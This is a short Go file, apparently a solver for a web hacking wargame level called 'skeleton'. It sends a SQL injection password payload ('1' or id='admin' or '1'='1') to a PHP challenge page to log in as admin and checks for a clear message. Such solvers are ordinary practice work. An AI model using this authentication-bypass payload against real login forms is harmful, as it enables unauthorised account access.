package problem

import(
	"fmt"
	"strings"
)

func Skeleton(session string){
	file := "skeleton_1668aab9d972ee1cf986bd9b395b0157.php"
	param := map[string]string{
		"pw" : "1' or id='admin' or '1'='1",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"SKELETON Clear!"){
		fmt.Println("SKELETON Clear!")
	}
}